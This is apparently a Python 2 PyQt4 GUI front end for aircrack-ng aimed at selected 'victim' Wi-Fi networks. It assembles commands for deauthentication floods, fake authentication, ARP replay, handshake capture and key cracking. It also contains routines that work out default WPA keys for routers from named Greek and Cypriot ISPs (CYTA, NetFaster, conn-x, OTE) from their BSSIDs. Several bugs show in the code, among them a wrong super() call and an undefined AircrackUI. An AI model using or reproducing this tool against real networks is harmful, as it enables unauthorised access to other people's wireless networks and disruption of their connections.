import subprocess
import os
import commands
import time
import re
import fileinput

from threading import Thread
from system_functions import *
from PyQt4 import QtGui, QtCore
from PyQt4.QtCore import *
from PyQt4.QtGui import *
from asg import Ui_Main_window


class Client(QDialog):
    def __init__(self,victim, parent=None):
        self.bssid = victim[1]
        self.victim = victim
        self.essid = victim[0]
        self.channel = victim[2]
        super(Client, self).__init__(parent)
        self.setFixedSize(350, 300)

        self.le = QLineEdit()
        self.le.setObjectName("host")

        self.pb = QPushButton()
        self.pb.setObjectName("connect")
        self.pb.setText("Connect") 

        self.sd = QPushButton()
        self.sd.setObjectName("start_deauth")
        self.sd.setText("Start Deauthentication")

        self.cy = QPushButton()
        self.cy.setObjectName("cyta_crack")
        self.cy.setText("Try Cyta Crack")

        self.nf = QPushButton()
        self.nf.setObjectName("NetFaster_crack")
        self.nf.setText("Try NetFaster crack 'Handshake Required'")

        self.ad = QPushButton()
        self.ad.setObjectName("airodump")
        self.ad.setText("Do airodump in that network")

        layout = QFormLayout()
        layout.addWidget(self.le)
        layout.addWidget(self.ad)
        layout.addWidget(self.pb)
        layout.addWidget(self.sd)
        layout.addWidget(self.cy)
        layout.addWidget(self.nf)

        self.setLayout(layout)
        self.connect(self.pb, SIGNAL("clicked()"),self.set_client)
        self.connect(self.sd, SIGNAL("clicked()"),self.start_deauthentication)
        self.connect(self.cy, SIGNAL("clicked()"),self.cyta_crack)
        self.connect(self.nf, SIGNAL("clicked()"),self.NetFaster_crack)
        self.connect(self.ad, SIGNAL("clicked()"),self.start_airodump_capture)
        self.setWindowTitle("Learning")


    def start_airodump_capture(self):
        self.airodump_capture = 'airodump-ng -c ' + self.channel + ' --bssid ' + self.bssid + ' -w output mon0'
        ct = Command_thread(str(self.airodump_capture))
        ct.start()

    def NetFaster_crack(self):
        generate_NetFaster_keyfile(self.bssid)
        crack_netfaster = 'aircrack-ng -b ' + self.bssid + ' -w netfasterkeys.txt output*.cap'
        ct = Command_thread(str(crack_netfaster))
        ct.start()


    def closeEvent(self, event):
        thr = RetardedKill("airodump-ng", 0)
        thr.start()
        self.victim[:] = []
        event.accept()


    def set_client(self):
        # shost is a QString object
        self.client = self.le.text()
        print 'provided client mac is ' + self.client 
        
    def start_deauthentication(self):
        thr = RetardedKill("aireplay-ng", 10)
        thr.start()

        deauth = 'sudo aireplay-ng -0 10 -a ' + self.bssid + ' -c ' + self.client + ' --ignore-negative-one mon0'
        ct = Command_thread(str(deauth))
        ct.start()

    def cyta_crack(self): 
        self.cyta_bases = 'bases.lst'
        self.bssid = str(self.bssid)   
        self.bssid_ventor = self.bssid[0:8] 
        self.bssid_serial = self.bssid[9:17] 
        self.keyfound = False
        for fline in fileinput.input(self.cyta_bases):
            if self.keyfound == True:
                break

            self.fvendor = fline[0:8]     
            self.fserial_start = fline[9:17]
            self.fserial_end = fline[18:26]
            self.fserial_num = fline[27:33]
            self.fbase = fline[34:40]
            self.finc = fline[41]
            
            if(self.bssid_ventor == self.fvendor and self.fserial_start <= self.bssid_serial <= self.fserial_end):   
                self.keyfound = True
                self.bssid_serial = self.bssid_serial.replace(':','')
                self.fserial_num = self.fserial_num.replace(' ','')  
                self.bssid_serial = int(self.bssid_serial,16)
                self.fbase = int(self.fbase,16)
                self.finc = int(self.finc)
                self.lserial = self.bssid_serial - self.fbase
                self.lserial = self.lserial / self.finc
                self.lserial = str(self.lserial)
                self.cc = len(self.lserial)
                self.zeros = (7 - self.cc)
                self.i = 0
                while(self.i < self.zeros): 
                    self.lserial = "0" + self.lserial
                    self.i = self.i + 1
                            
                print "*********************************"
                print "* Key found:                    *"
                print "* MAC = ",self.bssid,"     *"
                print "* WPA = ",self.fserial_num + "" + self.lserial ,"         *"
                print "*                               *"
                print "*********************************"

        if(self.keyfound == False):
            print 'Key is not in the list'

class WEP_Crack(QDialog):
    def __init__(self,victim,device_mac, parent=None):
        self.bssid = victim[1]
        self.victim = victim
        self.essid = victim[0]
        self.channel = victim[2]
        self.host_mac = device_mac
        super(Client, self).__init__(parent)
        self.setFixedSize(350, 300)

        self.ti = QPushButton()
        self.ti.setObjectName("wep_test_inject")
        self.ti.setText("Check WEP Injection") 

        self.si = QPushButton()
        self.si.setObjectName("start_wep_injection")
        self.si.setText("Start Airodump Capture")

        self.fa = QPushButton()
        self.fa.setObjectName("fake_auth")
        self.fa.setText("Start Fake Authentication")

        self.ca = QPushButton()
        self.ca.setObjectName("capture_packers")
        self.ca.setText("Capture packets")

        self.ck = QPushButton()
        self.ck.setObjectName("crack_key")
        self.ck.setText("Crack the Key")

        layout = QFormLayout()
        layout.addWidget(self.ti)
        layout.addWidget(self.si)
        layout.addWidget(self.fa)
        layout.addWidget(self.ca)
        layout.addWidget(self.ck)

        self.setLayout(layout)
        self.connect(self.ti, SIGNAL("clicked()"),self.test_inject)
        self.connect(self.si, SIGNAL("clicked()"),self.wpe_airodump_capture)
        self.connect(self.fa, SIGNAL("clicked()"),self.fake_authentication)
        self.connect(self.ca, SIGNAL("clicked()"),self.capture_wpe_packers)
        self.connect(self.ck, SIGNAL("clicked()"),self.crack_wpe_key)
        self.setWindowTitle("Learning")



    def test_inject(self):
        injection_test = 'aireplay-ng -9 -e ' + self.essid + ' -a ' + self.bssid + '--ignore-negative-one mon0'
        ct = Command_thread(str(injection_test))
        ct.start()

    def wpe_airodump_capture(self):
        airodump_capture = 'airodump-ng -c ' + self.channel + ' --bssid ' + self.bssid + ' -w output mon0'
        ct = Command_thread(str(airodump_capture))
        ct.start()

    def fake_authentication(self):
        fake_auth = 'aireplay-ng -1 6000 -o 1 -q 10 -e ' + self.essid + ' -a ' + self.bssid + ' -h ' + self.host_mac + ' mon0'
        ct = Command_thread(str(fake_auth))
        ct.start()

    def capture_wpe_packers(self):
        capture_ivs = 'aireplay-ng -3 -b ' + self.bssid + ' -h ' + self.host_mac + ' mon0'
        ct = Command_thread(str(capture_ivs))
        ct.start()


    def crack_wpe_key(self):
        fake_auth = 'aircrack-ng -b ' + self.bssid + ' output*.cap'
        ct = Command_thread(fake_auth)
        ct.start()


class Main_window_ex(QMainWindow, Ui_Main_window):
    
    def __init__(self, parent = None):
        """
        Default Constructor. It can receive a top window as parent. 
        """
        QMainWindow.__init__(self, parent)
        self.setupUi(self)
        self.table_networks.setSelectionBehavior(QtGui.QAbstractItemView.SelectRows)

        self.start_procedure_is_pressed = False
        self.device_interface = str()
        self.device_mac = str()
        self.output = list()
        self.victim = list()
        self.essid = str()
        self.bssid = str()
        self.channel = str()


    def closeEvent(self, event):
        reply = QtGui.QMessageBox.question(self, 'Message',
            "Are you sure to quit?", QtGui.QMessageBox.Yes | 
            QtGui.QMessageBox.No, QtGui.QMessageBox.No)

        if reply == QtGui.QMessageBox.Yes:
            if self.start_procedure_is_pressed == True:
                disable_monitor_mode('mon0')                             #[SUCCESS]
                start_network_manager()                                                 #[SUCCESS]
                commands.getstatusoutput('rm wifi-scan*')
                commands.getstatusoutput('rm output*')
                commands.getstatusoutput('rm netfasterkeys.txt')
            print 'programm exit: SUCCESS'
            event.accept()
        else:
            event.ignore()

    def check_network(self):
        self.victim[:] = []

        for idx in self.table_networks.selectedIndexes():
            self.victim.append(idx.data().toString()) 

        self.encryption = str(self.victim[4])
        self.essid = str(self.victim[0])
        self.bssid = str(self.victim[1])
        self.channel = str(self.victim[2])

        if self.encryption == 'OPN':
            print 'The network is open. Go connect! :)'

        elif self.encryption == 'WEP':
            self.wep = WEP_Crack(self.victim, self.device_mac)

        elif self.encryption == 'WPA' or self.encryption == 'WPA2' or self.encryption == 'WPA2WPA':
            self.w = Client(self.victim)
            self.w.setGeometry(QRect(100, 100, 400, 200))
            
            if self.essid[0:5] == 'CYTA':
                self.w.show()
                
            elif self.essid[0:9] == 'NetFaster':
                self.w.show()
            elif self.essid[0:8] == 'Thomson' or self.essid[0:10] == 'speedtouch':
                print 'Thomnson crack not Implemented yet'
                
            elif self.essid[0:6] == 'conn-x':
                if self.essid[6:12] == self.bssid[9:17].replace(':','').lower():
                    print 'key is ' + self.bssid.replace(':','').lower()
                    print 'try that key too ' + '1234567890123'
                else:
                    print 'try that key ' + '1234567890123'
            elif self.essid[0:4] ==  'OTE':
                if self.essid[4:11] == self.bssid[9:17].replace(':','').tolower():
                    print 'key is ' + self.bssid.replace(':','').lower()
                    print 'try that key too ' + '1234567890123'
                    print 'try that key too' + '0' + self.bssid.replace(':','').lower()
                else:
                    print 'try that key ' + '1234567890123'
                    print 'try that key too' + '0' + self.bssid.replace(':','').lower()
            else:
                print 'Couldn\'t fing known network. We\' get the Handshake though!'
                self.w.show()

        else:
            print 'Error: Can\'t find the encryption of the network'

    def scan_process(self):
        sender = self.sender()
        self.statusBar().showMessage('Process started')
        if self.start_procedure_is_pressed == True:
            rescan(self)
        else:
            first_scan(self)


def main():
    import sys
    app = QtGui.QApplication(sys.argv)
    ex = AircrackUI()
    sys.exit(app.exec_())


if __name__ == "__main__":
    import sys
    app = QtGui.QApplication(sys.argv)
    ui = Main_window_ex()
    ui.show()
    sys.exit(app.exec_())

